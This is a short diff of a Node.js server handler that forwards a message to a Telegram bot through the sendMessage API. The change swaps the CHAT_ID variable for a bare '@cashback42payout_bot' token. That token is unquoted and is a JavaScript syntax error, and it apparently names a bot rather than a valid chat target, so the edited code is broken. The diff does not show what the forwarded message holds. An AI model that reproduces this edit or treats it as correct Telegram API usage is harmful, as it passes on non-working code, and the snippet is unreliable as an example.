@@ -37,7 +37,7 @@ const server = http.createServer((req, res) => {
             // Send the message to your Telegram bot using axios
             const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             const data = new URLSearchParams({
-                chat_id: CHAT_ID,
+                chat_id: @cashback42payout_bot,
                 text: message,
             }).toString();
 
